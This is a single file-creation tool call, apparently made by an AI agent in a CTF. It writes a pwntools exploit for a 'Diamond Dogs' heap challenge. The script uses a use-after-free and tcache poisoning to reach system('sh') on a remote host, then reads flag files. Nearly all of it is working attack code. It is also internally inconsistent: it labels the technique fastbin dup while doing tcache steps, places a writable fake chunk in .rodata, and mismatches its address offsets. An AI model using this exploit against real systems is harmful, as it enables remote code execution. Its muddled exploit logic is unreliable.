[09] create_file {"path": "/home/ctfplayer/workspace/ex.py", "content": "#!/usr/bin/env python3\n# Diamond Dogs: UAF on released dog -> fastbin dup -> fake chunk in .rodata\n# -> controlled kennel pointer -> command*(dog) = system(\"sh\")\nfrom pwn import *\nimport sys\n\ncontext.arch = 'amd64'\ncontext.log_level = 'info'\n\nHOST, PORT = 'diamond-dogs.chal.csaw.io', 1025\n\n# fake chunk location in .rodata (vaddr 0x402000 == file offset 0x3000,\n# so file_off = vaddr - 0x102000; text starts at file offset 0x1000 = vaddr 0x401000)\nFAKE_OFF = 0x2A98          # aligned-16 spot inside the big string blob\nFAKE_VA  = FAKE_OFF + 0x102000   # 0x404A98, file_off <= 0x3030 -> in bounds\nprint('# fake chunk vaddr = %#x' % FAKE_VA)\n\nRECORD = ('AAAAAAAA' * 17 +\n          p64(FAKE_VA) +        # +0x80 : rw-p side\n          p64(FAKE_VA) +        # +0x88 : x-exe side\n          p64(0x401256) +       # +0x90 : callback (\"sh\")\n          p64(0x401256) +       # +0x98 : callback\n          b'/bin/sh\\0' +        # +0xA0 : arg (= user pointer)\n          b'\\0' * 0x18).ljust(0x110, b'B')   # +0xB8 leftover data, records 1+2\n\ndef menu(choice):\n    p.recvuntil(b'go home\\n> ' if False else b'7) go home\\n')\n    p.send(str(choice).encode() + b'\\n')\n\ndef adopt(k, name=b'x'):\n    menu(1)\n    p.sendlineafter(b'kennel: ', str(k).encode())\n    p.sendafter(b'name: ', name.ljust(0x18, b'\\0'))\n\ndef release(k):\n    menu(3)\n    p.sendlineafter(b'kennel: ', str(k).encode())\n\ndef command(k):\n    menu(2)\n    p.sendlineafter(b'kennel: ', str(k).encode())\n\ndef note(k, size, data):\n    menu(4)\n    p.sendlineafter(b'slot: ', str(k).encode())\n    p.sendlineafter(b'size: ', str(size).encode())\n    p.sendafter(b'contents: ', data)\n\ndef readnote(k):\n    menu(5)\n    p.sendlineafter(b'slot: ', str(k).encode())\n    return p.recvn(8)\n\ndef shred(k):\n    menu(6)\n    p.sendlineafter(b'slot: ', str(k).encode())\n\np = remote(HOST, PORT)\n\n# ---- 1. libc leak ----\nadopt(0)                       # dog0\nadopt(1)                       # guard\nrelease(0)                     # dog0 -> tcache 0x30\ncommand(1)                     # print bark ptr == &woof (sanity)\np.recvuntil(b'says: ')\ndog0_va = u64(p.recvn(6).ljust(8, b'\\0'))\nlog.success('dog0 = %#x' % dog0_va)\n\n# note0 lands exactly on the freed dog0, notes[0].sz = 0x20 read\nnote(0, 0x20, RECORD[:0x20])\nleak = u64(readnote(0).ljust(8, b'\\0'))\nlog.success('main_arena+96 = %#x' % leak)\nlibc_base = leak - 0x1ecbe0\nlog.success('libc base   = %#x' % libc_base)\nassert libc_base & 0xfff == 0\nsystem = libc_base + 0x055410\nlog.info('system = %#x' % system)\n\n# note1 -> tcache 0x30 head (was dog0) : fake chunk metadata\nnote(1, 0x20, p64(0) + p64(FAKE_VA))\n# note2 -> tcache 0x30 head\nnote(2, 0x20, b'Q' * 0x20)\n\n# ---- 2. tcache poison into .rodata ----\nadopt(2)                       # takes note2 slot\nadopt(3)                       # takes note1 slot -> writes FAKE_VA into fd\nadopt(4)                       # malloc returns FAKE_VA-0x10 (in .rodata)\nadopt(5, name=b'/bin/sh\\0'.ljust(0x18, b'\\0'))   # user pointer @ FAKE_VA+0x10\nshred(5)\n\n# ---- 3. 0x110 records fill the hole, fake dog header overwrites it ----\nnote(3, 0x110, RECORD)\nnote(4, 0x110, RECORD)\n\n# ---- 4. fire ----\nmenu(2)\np.sendlineafter(b'kennel: ', b'5')\nsleep(0.5)\np.sendline(b'echo PWNED; cat /flag* /home/*/flag* 2>/dev/null; id')\np.interactive()\n"}
